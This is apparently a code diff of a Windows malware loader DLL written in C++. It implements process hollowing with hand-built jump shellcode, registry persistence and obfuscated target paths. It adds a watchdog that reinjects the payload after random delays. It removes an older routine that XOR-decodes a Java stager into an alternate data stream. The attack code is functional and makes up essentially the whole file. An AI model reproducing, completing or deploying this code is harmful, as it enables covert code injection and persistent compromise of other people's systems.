@@ -4,12 +4,17 @@
 #include "stdafx.h"
 #include <windows.h>
 #include "ph.h"
+#include <time.h>
+#include <sstream>
 
 
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "User32.lib")
 
 FILE * debug_file_handle = stdout;
+
+//Flag to determine if we are the target or watcher
+bool watch_target = false;
 
 extern "C" __declspec (dllexport) void __cdecl RegisterDll (
    HWND hwnd,        // handle to owner window
@@ -46,22 +51,20 @@ char * decode_split( const char * input, unsigned int str_len ){
 	return test;
 }
 
-LPVOID ReadRemotePEB(HANDLE hProcess, LPVOID dwPEBAddress )
+PEB_PARTIAL ReadRemotePEB(HANDLE hProcess, LPVOID dwPEBAddress )
 {
-	LPVOID pPEB;
-
+	PEB_PARTIAL pPEB;
+	memset(&pPEB, 0, sizeof(PEB_PARTIAL));
+	
 	BOOL bSuccess = ReadProcessMemory
 		(
 		hProcess,
-		(LPCVOID)((size_t)dwPEBAddress + (sizeof(size_t) * 2)),
+		(LPCVOID)((size_t)dwPEBAddress),
 		&pPEB,
 		sizeof(pPEB),
 		0
 		);
-
-	if (!bSuccess)
-		return 0;
-
+	
 	return pPEB;
 }
 
@@ -87,43 +90,48 @@ int enableSEPrivilege(LPCTSTR name)
 	return 1;
 }
 
-void CreateHollowedProcess( const char* pDestCmdLine )
-{
+
+bool GetResourceImageBuffer(DWORD resID, char **ImgResData, DWORD *sourceImgSize) {
 	HGLOBAL hResourceLoaded;  // handle to loaded resource
     HRSRC   hRes;              // handle/ptr to res. info.
-    char    *ImgResData;        // pointer to resource data
-    DWORD   sourceImgSize;
-	NTSTATUS stat;
-		
+
 	//Get the resource
-	hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");
-	if( hRes == nullptr ){
-		
+	hRes = FindResource(dll_handle, MAKEINTRESOURCE(resID) ,"BIN");
+	if( hRes == nullptr ) { 
 #ifdef _DBG
 			fprintf( debug_file_handle,"Unable to find resource.\r\n");
 #endif
-		return;
+		return false;
 	}
 
     hResourceLoaded = LoadResource(dll_handle, hRes);
-	if( hResourceLoaded == nullptr ){
-		
+	if( hResourceLoaded == nullptr ) {
 #ifdef _DBG
 			fprintf( debug_file_handle,"Unable to load resource.\r\n");
 #endif
-		return;
+		return false;
 	}
 
-    ImgResData = (char *) LockResource(hResourceLoaded);
-	if( hResourceLoaded == nullptr ){
-		
+    *ImgResData = (char *)LockResource(hResourceLoaded);
+	if( hResourceLoaded == nullptr ) {
 #ifdef _DBG
 			fprintf( debug_file_handle,"Unable to lock resource.\r\n");
 #endif
-		return;
+		return false;
 	}
 
-    sourceImgSize = SizeofResource(dll_handle, hRes);
+    *sourceImgSize = SizeofResource(dll_handle, hRes);
+#ifdef _DBG
+	fprintf( debug_file_handle,"file size %d\n", *sourceImgSize);
+#endif
+
+	return true;
+}
+
+
+DWORD CreateHollowedProcess( const char* pDestCmdLine, char* ImgData, bool dll_entry )
+{
+	NTSTATUS stat;
 	
 #ifdef _DBG
 		fprintf( debug_file_handle,"Creating process\r\n");
@@ -139,7 +147,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] CreateProcessW failed. Error = %x\n", GetLastError());
 #endif
-		return;
+		return 0;
 	}
 
 	//Resolve necessary functions
@@ -153,7 +161,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] GetProcAddress failed\n");
 #endif
-	return;
+		return 0;
 	}
 
 	//Get process information
@@ -164,16 +172,15 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle,"[-] ZwQueryInformation failed\n");
 #endif
-		return;
+		return 0;
     }
 
 
 #ifdef _DBG
 	fprintf(debug_file_handle, "[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);
 #endif
-	SIZE_T ImageBase = (SIZE_T)ReadRemotePEB(pProcessInfo->hProcess , pbi.PebBaseAddress );
-
-
+	PEB_PARTIAL peb_struct = (PEB_PARTIAL)ReadRemotePEB(pProcessInfo->hProcess , pbi.PebBaseAddress );
+	PVOID ImageBase = peb_struct.ImageBaseAddress;
 
 #ifdef _DBG
 	fprintf(debug_file_handle, "[+] ImageBase = 0x%x\n", ImageBase);
@@ -191,7 +198,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] ReadProcessMemory failed\n");
 #endif
-		return;
+		return 0;
 	}
 
 
@@ -199,7 +206,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 
 
 	//Load replacement image
-	PLOADED_IMAGE pSourceImage = GetLoadedImage((BYTE *)ImgResData);
+	PLOADED_IMAGE pSourceImage = GetLoadedImage((BYTE *)ImgData);
 
 	LARGE_INTEGER a;
 	a.QuadPart = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
@@ -209,7 +216,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}
 
 	SIZE_T size;
@@ -221,7 +228,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}	
 
 	//Unmap the test location
@@ -236,7 +243,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}	
 		
 	#ifdef _M_IX86
@@ -251,15 +258,15 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 	PVOID addr = (PVOID)&ptr->OptionalHeader.ImageBase;
 	PVOID beg = (PVOID)ptr;
 	size_t diff = (size_t)addr - (size_t)beg;
-	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ImgResData;
+	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)ImgData;
 	size_t image_base = pDOSHeader->e_lfanew + diff;
 		
 	//copy the headers to the dest buffer
-	memcpy(	BaseAddress, ImgResData, pSourceImage->FileHeader->OptionalHeader.SizeOfHeaders );
+	memcpy(	BaseAddress, ImgData, pSourceImage->FileHeader->OptionalHeader.SizeOfHeaders );
 	
 	//Image entry
 #ifdef _DBG
-	fprintf(debug_file_handle, "Loaded image entry point: %d\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
+	fprintf(debug_file_handle, "Loaded image entry point: 0x%x\n", pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint);
 #endif 
 
 	//Base before
@@ -286,7 +293,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 			fprintf( debug_file_handle,"Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);
 		#endif
 
-		memcpy( pSectionDestination, &ImgResData[pSourceImage->Sections[x].PointerToRawData],
+		memcpy( pSectionDestination, &ImgData[pSourceImage->Sections[x].PointerToRawData],
 			pSourceImage->Sections[x].SizeOfRawData);
 	}	
 
@@ -317,7 +324,8 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 	#endif
 
     // Rebase image if necessary, x86 and x64
-	if (dwDelta)
+	if (dwDelta){
+
 		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
 		{
 			char* pSectionName = ".reloc";		
@@ -337,13 +345,13 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 
 			while (dwOffset < relocData.Size)
 			{
-				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&ImgResData[dwRelocAddr + dwOffset];
+				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&ImgData[dwRelocAddr + dwOffset];
 
 				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
 
 				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
 
-				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&ImgResData[dwRelocAddr + dwOffset];
+				PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&ImgData[dwRelocAddr + dwOffset];
 
 				for (DWORD y = 0; y <  dwEntryCount; y++)
 				{
@@ -373,8 +381,11 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 			break;
 		}
 
+	}
 
-	
+	////Load any dll import needed by the program
+	//LoadDllImports( BaseAddress );
+
 	//Map the orginial over our data
 	size = pSourceImage->FileHeader->OptionalHeader.SizeOfImage;
 	if ((stat = ZwMapViewOfSection(image_sect, pProcessInfo->hProcess, &RemoteAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
@@ -382,7 +393,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}
 
 
@@ -396,7 +407,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle,"[-] ZwCreateSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}
 
 	//Set size
@@ -406,14 +417,81 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}	
 	
 	//Entrypoint addr
 	size_t entr_addr = (size_t)RemoteAddress + pSourceImage->FileHeader->OptionalHeader.AddressOfEntryPoint;
 	DWORD counter = 0;	
-	unsigned char jmpshellcode[sizeof(size_t) + 4];
+	unsigned int sc_size = 0x50;
+	unsigned char jmpshellcode[0x50];
+	memset(jmpshellcode, 0, sc_size);
 
+	//Add breakpoint
+#ifdef _DBG
+//	*(unsigned char *)&jmpshellcode[counter++] = 0xcc;	   // breakpoint
+#endif
+
+
+	//Add reason and dll entry load addr
+	if( dll_entry ){
+
+#ifdef _M_X64
+
+		//Add Reserved to R8
+		*(unsigned char *)&jmpshellcode[counter++] = 0x49;
+		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV R8, IMM64 (entry addr)
+		*(size_t *) &jmpshellcode[counter] = 0x12;
+		counter = counter + sizeof(size_t);
+
+		//Add DLL reason to RDX
+		*(unsigned char *)&jmpshellcode[counter++] = 0x48;
+		*(unsigned char *)&jmpshellcode[counter++] = 0xba;	   // MOV RDX, IMM64 (entry addr)
+		*(size_t *) &jmpshellcode[counter] = 0x1;
+		counter = counter + sizeof(size_t);
+
+		//Base Addr to RCX
+		*(unsigned char *)&jmpshellcode[counter++] = 0x48;
+		*(unsigned char *)&jmpshellcode[counter++] = 0xb9;	   // MOV RCX, IMM64 (entry addr)
+		*(size_t *) &jmpshellcode[counter] = (size_t)RemoteAddress;
+		counter = counter + sizeof(size_t);
+
+#else
+		//POP RETURN PTR 
+		*(unsigned char *)&jmpshellcode[counter++] = 0x59;     // POP ECX
+
+		//Add Reserved
+		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
+		*(size_t *) &jmpshellcode[counter] = 0x12;
+		counter = counter + sizeof(size_t);
+
+		//PUSH 
+		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
+
+		//Add dll attach type parameter
+		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
+		*(DWORD *) &jmpshellcode[counter] = 0x1;
+		counter = counter + sizeof(DWORD);
+
+		//PUSH 
+		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
+
+		//Add process base address
+		*(unsigned char *)&jmpshellcode[counter++] = 0xb8;	   // MOV EAX, IMM64 (entry addr)
+		*(size_t *) &jmpshellcode[counter] = (size_t)RemoteAddress;
+		counter = counter + sizeof(size_t);
+
+		//PUSH 
+		*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
+
+		//PUSH RETURN PTR 
+		*(unsigned char *)&jmpshellcode[counter++] = 0x51;     // PUSH ECX
+
+#endif
+
+	}
+
+	
 #ifdef _M_X64
 	*(unsigned char *)&jmpshellcode[counter++] = 0x48;
 #endif
@@ -422,12 +500,11 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 	*(size_t *) &jmpshellcode[counter] = entr_addr;
 	counter = counter + sizeof(size_t);
 
-	//PUSH and return
+	//PUSH address of entry point
 	*(unsigned char *)&jmpshellcode[counter++] = 0x50;     // PUSH EAX
 	*(unsigned char *)&jmpshellcode[counter++] = 0xc3;     // RET
 
 	//copy the binary to the mapped buffer
-	//memset((BYTE*)read_proc + rem_entry_pt, 0xCC, 1);
 	memcpy((BYTE*)read_proc + rem_entry_pt, jmpshellcode, sizeof(jmpshellcode));
 	memcpy(BaseAddress, read_proc, image_size);
 	BaseAddress = (PVOID)ImageBase;
@@ -441,7 +518,7 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 #ifdef _DBG
 		fprintf(debug_file_handle, "[-] ZwMapViewOfSection failed. NTSTATUS = %x\n", stat);
 #endif
-		return;
+		return 0;
 	}
 
 	//*********************
@@ -459,7 +536,10 @@ void CreateHollowedProcess( const char* pDestCmdLine )
 	ResumeThread(pProcessInfo->hThread);
 	//system("pause");
 
+	return pProcessInfo->dwProcessId;
+
 }
+
 
 void DllPersistence( char *module_path ){
 
@@ -507,22 +587,125 @@ void DllPersistence( char *module_path ){
 
 }
 
-int main(int argc, char* argv[])
-{
+int main(int argc, char* argv[]){
+	
+	//Check the global else load the watchdog
+	if( watch_target ){
+
+		LoadPayload();
+		exit(1);
+
+	} else {	
+
+		LoadWatchDog();
+	}
+	
+}
+
+//====================================================================
+/*
+*
+*	Function for loading the watchdog process
+*
+*/
+void LoadWatchDog() {
 
 #ifdef _DBG
 	FILE *f;
 	fopen_s(&f, "C:\\debug_dll.log", "w");
 	if( f == nullptr )
-		return -1;
+		return;
+
+	setvbuf(f, NULL, _IONBF, 0);
+	debug_file_handle = f;
+#endif
+
+	HANDLE hFile;
+	char module_name[MAX_PATH];
+	int dwLength = 0;
+	char *imgBuffer = NULL;
+	DWORD imgBufferSize = 0, bytesRead = 0;
+
+
+	//Get watch dog host path
+    char watchdog_host[400];
+	LoadString(dll_handle, IDS_WATCHDOG_HOST, watchdog_host, 400);
+	if( strlen( watchdog_host ) == 0 ){
+#ifdef _DBG
+		fprintf( debug_file_handle, "[-] Error: Watchdog host path not set. Exiting\n");
+		fclose(debug_file_handle);
+#endif
+		return;
+	}
+
+	//Deobfuscate it
+	char *watchdog_host_ptr = decode_split(watchdog_host, 400);
+	std::string hollow_proc_str(watchdog_host_ptr);
+	free(watchdog_host_ptr);
+
+		
+	memset(module_name, 0, MAX_PATH );
+
+	//Get the dll module name
+	dwLength = GetModuleFileName(dll_handle, module_name, MAX_PATH);
+
+	//open file and read its contents
+	hFile = CreateFile(module_name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if(hFile != INVALID_HANDLE_VALUE) {
+		imgBufferSize = GetFileSize(hFile, NULL);
+		if(imgBufferSize != INVALID_FILE_SIZE) {
+			imgBuffer = (char *)malloc(imgBufferSize+1);
+			if(imgBuffer)
+				ReadFile(hFile, imgBuffer, imgBufferSize, &bytesRead, NULL);
+
+		}
+		CloseHandle(hFile);
+	} 
+		
+	//Add registry persistence
+	DllPersistence(module_name);
+
+	//Create an env variable with the name of the dll
+	if (! SetEnvironmentVariable("TMP", module_name )) {
+#ifdef _DBG
+		fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
+		fclose(debug_file_handle);
+#endif
+        return;
+    }
+
+	//create new hollowed process and fill with loader
+	if((imgBufferSize > 0) && imgBufferSize == bytesRead) {
+		
+		//If the process string is not empty
+		if(hollow_proc_str.length() > 0)
+			CreateHollowedProcess(hollow_proc_str.c_str(), imgBuffer, true );
+
+	}
+	
+	if(imgBuffer)
+		free(imgBuffer);
+
+#ifdef _DBG
+	fclose(debug_file_handle);
+#endif
+
+}
+
+void LoadPayload(){
+
+
+#ifdef _DBG
+	FILE *f;
+	fopen_s(&f, "C:\\debug_dll2.log", "w");
+	if( f == nullptr )
+		return;
 
 	setvbuf(f, NULL, _IONBF, 0);
 	debug_file_handle = f;
 #endif
 	
-	std::string hollow_proc_str;
 	int adminPrivs = enableSEPrivilege(SE_DEBUG_NAME);
-
 
 	//Set java home
 	//Get authentication string from resource table
@@ -546,154 +729,128 @@ int main(int argc, char* argv[])
 		{
 	#ifdef _DBG
 			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
+			fclose(debug_file_handle);
 	#endif
 			free(java_home);
-			return 0;
+			return;
 		}
 		//free mem
 		free(java_home);
 
 	}
+	
+    //String holding the dll path and pid
+	std::string dll_path_pid;
+	size_t len;
+
+	//TEMP
+	char *temp_ptr = decode_split("\x5\x4\x4\x5\x4\xd\x5\x0",8);
+	//Get TEMP env
+	char * temp_env = nullptr;
+	_dupenv_s (&temp_env, &len, temp_ptr);
+	free(temp_ptr);
+
+	//TMP
+	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);
+
+	//Get TMP env - this is the one we set in proc hollow
+	char * tmp_env = nullptr;
+	_dupenv_s (&tmp_env, &len, tmp_ptr);
+	if( tmp_env && strlen(tmp_env) > 0 ){
+		//Create string stream
+		std::stringstream ss;
+		ss << tmp_env << "|" << GetCurrentProcessId();
+		dll_path_pid.assign(ss.str());
+
+		//Free memory
+		free(tmp_env);
+
+		//Create an env variable with the name of the dll
+		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
+	#ifdef _DBG
+			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
+			fclose(debug_file_handle);
+	#endif
+			return;
+		}
+	}
+
+	//Get payload host path
+    char payload_host[400];
+	LoadString(dll_handle, IDS_PAYLOAD_HOST, payload_host, 400);
+	if( strlen( payload_host ) == 0 ){
+#ifdef _DBG
+		fprintf( debug_file_handle, "[-] Error: Payload host path not set. Exiting\n");
+		fclose(debug_file_handle);
+#endif
+		return;
+	}
+
+	//Deobfuscate it
+	char *payload_host_ptr = decode_split(payload_host, 400);
+	std::string hollow_proc_str(payload_host_ptr);
+	free(payload_host_ptr);
+
+	char *imgResData = NULL;
+	DWORD imgDataSize = 0;
+
+	//Get the resource buffer
+	if( !GetResourceImageBuffer(IDR_BIN1, &imgResData, &imgDataSize) ){
+#ifdef _DBG
+		fprintf( debug_file_handle, "[-] Error: Unable to get resource.\n");
+		fclose(debug_file_handle);
+#endif
+		return;
+	}
+
+	//Initialize rand
+	srand ( (unsigned int )time(NULL));
+
+	//Create new process repeatedly
+	while( 1 ){
+
+		DWORD proc_pid = CreateHollowedProcess( hollow_proc_str.c_str(), imgResData, false );
+		HANDLE proc_handle = OpenProcess( SYNCHRONIZE, TRUE, proc_pid);
+
+		//Reset
+		if( temp_env && (strcmp(tmp_env, temp_env) != 0)  ){		
+			//Set TMP back to TEMP
+			SetEnvironmentVariable(tmp_ptr, temp_env);
+			
+		} else {
+			//Reset TMP var
+			SetEnvironmentVariable(tmp_ptr, "");
+		}
+
+		WaitForSingleObject(proc_handle, INFINITE );
+			
+		//Range from 3 mins to 8
+		unsigned int rand_num =  ( rand() % (1000 * 60 * 5) ) + (1000 * 60 * 3);
+		Sleep(rand_num);
+
+#ifdef _DBG
+		fprintf( debug_file_handle,"Restarting monitored process.");
+#endif
+		//Set it back
+		if (! SetEnvironmentVariable("TMP", dll_path_pid.c_str() )) {
+	#ifdef _DBG
+			fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
+			fclose(debug_file_handle);
+	#endif
+			return;
+		}
+
+	}
+	
 
 	
-	//Get the filename of the DLL
-	char module_name[MAX_PATH]; 
-	GetModuleFileName( dll_handle, module_name, MAX_PATH );
-
-	//Add the ADS reference
-	std::string classPath(module_name);
-	classPath.append(COLON);
-
-	//Add registry persistence
-	DllPersistence(module_name);
-
-
-	//Create an env variable with the name of the dll
-	//TMP
-	char *tmp = decode_split("\x5\x4\x4\xd\x5\x0",6);
-	if (! SetEnvironmentVariable(tmp, classPath.c_str()) ) 
-    {
-#ifdef _DBG
-		fprintf( debug_file_handle,"SetEnvironmentVariable failed (%d)\n", GetLastError());
-#endif
-		free(tmp);
-        return 0;
-    }
-	//Free mem
-	free(tmp);
-
-	//Extract java stager
-	if( !ExtractStager( classPath )){
-#ifdef _DBG
-		fprintf( debug_file_handle,"Unable to extract stager.\n", GetLastError());
-#endif
-        return 0;	
-	}
-
-	//"\\System32\\svchost.exe"
-	std::string path(decode_split("\x5\xc\x5\xc\x5\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x3\x3\x3\x2\x5\xc\x5\xc\x7\x3\x7\x6\x6\x3\x6\x8\x6\xf\x7\x3\x7\x4\x2\xe\x6\x5\x7\x8\x6\x5",46));
-	//systemroot
-	std::string root(decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x7\x2\x6\xf\x6\xf\x7\x4",20));
-
-	char * pSystemRoot = nullptr;
-	size_t len;
-	_dupenv_s (&pSystemRoot, &len, root.c_str());
-	if( pSystemRoot && strlen(pSystemRoot) > 0 ){
-
-		//Add system root
-		hollow_proc_str.assign(pSystemRoot);
-		hollow_proc_str.append(path);
-
-		CreateHollowedProcess( hollow_proc_str.c_str());
-	}
+	//Free memory
+	free(tmp_ptr);
 
 #ifdef _DBG
 	fclose(debug_file_handle);
 #endif
 
-	return 0;
-}
-
-//=========================================================================
-/**
-	Extract the stager and write to ADS
-*/
-bool ExtractStager( std::string passedPath){
-
-    HGLOBAL hResourceLoaded;  // handle to loaded resource
-    HRSRC   hRes;              // handle/ptr to res. info.
-    char    *lpResLock;        // pointer to resource data
-    DWORD   dwSizeRes;
-    std::string strOutputLocation;
-    std::string strAppLocation;
-		
-	DWORD dwRet = 0;
-
-	HANDLE hStream = CreateFile( passedPath.c_str(), GENERIC_WRITE,
-                             FILE_SHARE_WRITE, NULL,
-                             OPEN_ALWAYS, 0, NULL );
-
-    if( hStream != INVALID_HANDLE_VALUE ){
-
-		
-		//Get the resource
-		hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN2) ,"BIN");
-		if( hRes == nullptr ){
-		
-#ifdef _DBG
-			fprintf( debug_file_handle,"Unable to find java resource.\r\n");
-#endif
-			return false;
-		}
-
-		hResourceLoaded = LoadResource(dll_handle, hRes);
-		if( hResourceLoaded == nullptr ){
-		
-#ifdef _DBG
-			fprintf( debug_file_handle,"Unable to load resource.\r\n");
-#endif
-			return false;
-		}
-
-		lpResLock = (char *) LockResource(hResourceLoaded);
-		dwSizeRes = SizeofResource(dll_handle, hRes);
-
-		//Write file if not zero
-		if( !dwSizeRes ){
-#ifdef _DBG
-			fprintf( debug_file_handle,"Resource size is zero.\r\n");
-#endif
-			return false;
-		}
-
-		//Allocate memory
-		char *buf = (char *)malloc( dwSizeRes );
-		memcpy( buf, lpResLock, dwSizeRes );
-
-		//Decode XOR
-		char *xor_key = "\xa3\x45\x23\x06\xf4\x21\x42\x81\x72\x11\x92\x29";
-		int len = strlen(xor_key);
-
-		//XOR the data
-		for( DWORD i = 0; i < dwSizeRes; i++ )
-			buf[i] = buf[i] ^ xor_key[i % len];			
-		
-		
-		if( !WriteFile(hStream, buf, dwSizeRes, &dwRet, NULL)){
-#ifdef _DBG
-			fprintf( debug_file_handle,"Unable to write java file.\r\n");
-#endif
-			free(buf);
-			return false;
-		}
-		//Free mem
-		free(buf);
-		
-
-		CloseHandle(hStream);
-	}
-
-	return true;
 
 }
 
@@ -707,8 +864,14 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
 	switch( dwReason ) 
     { 
 		case DLL_PROCESS_ATTACH:
-		  dll_handle = (HMODULE)hinstDLL;
-          main(0, nullptr);
+			dll_handle = (HMODULE)hinstDLL;
+
+			//If the reserved flag is set, we are the injected process
+			if( lpReserved )
+				watch_target = true;
+
+			main(0, nullptr);
+
 		case DLL_PROCESS_DETACH:
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
